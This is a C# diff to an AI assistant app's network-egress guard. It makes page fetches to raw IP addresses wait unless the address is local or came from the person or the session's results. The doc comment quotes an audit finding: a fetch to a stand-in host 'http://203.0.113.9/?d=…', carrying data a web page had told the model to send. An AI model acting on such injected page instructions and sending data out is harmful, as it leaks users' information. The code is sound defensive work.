@@ -16,8 +16,10 @@ namespace Baxy.App;
 /// least <see cref="MinimumRememberedCharacters"/> letters or digits, compared folded: case, accents, spacing and
 /// URL escapes aside), or a host that came neither from this session's results (their address fields: a search result,
 /// a page fetched or read, a tab) nor from the person's words (the site's name, «youtube» for www.youtube.com). A
-/// search followed by the fetch of one of its results never waits; an address literal carries no words and is
-/// checked only for remembered values. Which calls go out is the catalog's typed fact (al máximo 5.1: the network
+/// search followed by the fetch of one of its results never waits. An address literal (an IP) carries no words: a ping
+/// to one goes, and so does a page in the person's own network (loopback, private, link-local), but a page at any
+/// other IP waits unless the person wrote it or a result gave it (auditoría de la App, 2026-10-23: a fetch of
+/// «http://203.0.113.9/?d=…» left the PC unasked, the plainest way out for what a page told the model to send). Which calls go out is the catalog's typed fact (al máximo 5.1: the network
 /// effect, with the call's exact arguments), and the address is the call's <c>url</c> or <c>host</c>. A heartbeat holds
 /// every such call already (NativeTurnLoop.BeatProposes).
 /// </summary>
@@ -56,10 +58,12 @@ internal sealed class NetworkEgress
             }
         }
 
-        string? address = Text(arguments["url"]) ?? Text(arguments["host"]);
-        return address is not null && HostOf(address) is { Length: > 0 } host && !Grounded(host)
-            ? "host_not_from_session"
-            : null;
+        string? url = Text(arguments["url"]);
+        string? address = url ?? Text(arguments["host"]);
+        return address is not null && HostOf(address) is { Length: > 0 } host
+            && !Grounded(host, carriesPage: url is not null)
+                ? "host_not_from_session"
+                : null;
     }
 
     /// <summary>The person's words in this session, and the addresses they wrote or dictated in them.</summary>
@@ -80,6 +84,15 @@ internal sealed class NetworkEgress
             if (HostOf(address.Value) is { Length: > 0 } host)
             {
                 _hosts.Add(host);
+            }
+        }
+
+        // An address the person wrote as its IP («http://192.0.2.7/estado») is theirs too.
+        foreach (Match address in Regex.Matches(words, @"(?<![\d.])\d{1,3}(?:\.\d{1,3}){3}(?![.]?\d)"))
+        {
+            if (IPAddress.TryParse(address.Value, out IPAddress? ip))
+            {
+                _hosts.Add(ip.ToString());
             }
         }
     }
@@ -151,11 +164,11 @@ internal sealed class NetworkEgress
         }
     }
 
-    private bool Grounded(string host)
+    private bool Grounded(string host, bool carriesPage)
     {
-        if (IPAddress.TryParse(host, out _))
+        if (IPAddress.TryParse(host.Trim('[', ']'), out IPAddress? ip))
         {
-            return true;
+            return !carriesPage || InPersonsNetwork(ip) || _hosts.Contains(host) || _hosts.Contains(ip.ToString());
         }
 
         if (_hosts.Any(seen => host == seen || host.EndsWith("." + seen, StringComparison.Ordinal)
@@ -176,6 +189,31 @@ internal sealed class NetworkEgress
         // A name with hyphens is the person's when they said every part of it («rfc editor» for rfc-editor.org).
         string[] parts = name.Split('-', StringSplitOptions.RemoveEmptyEntries);
         return name.Length >= 3 && parts.Length > 0 && parts.All(_words.Contains);
+    }
+
+    // The PC itself, the person's own network, or a device linked to it: a page there is not on the internet.
+    private static bool InPersonsNetwork(IPAddress ip)
+    {
+        if (ip.IsIPv4MappedToIPv6)
+        {
+            ip = ip.MapToIPv4();
+        }
+
+        if (IPAddress.IsLoopback(ip))
+        {
+            return true;
+        }
+
+        if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6)
+        {
+            return ip.IsIPv6LinkLocal || ip.IsIPv6SiteLocal || ip.IsIPv6UniqueLocal;
+        }
+
+        byte[] bytes = ip.GetAddressBytes();
+        return bytes[0] == 10
+            || (bytes[0] == 172 && bytes[1] is >= 16 and <= 31)
+            || (bytes[0] == 192 && bytes[1] == 168)
+            || (bytes[0] == 169 && bytes[1] == 254);
     }
 
     // Every word of the name is one the person said in this session («doom eternal» in «pon Doom Eternal»).
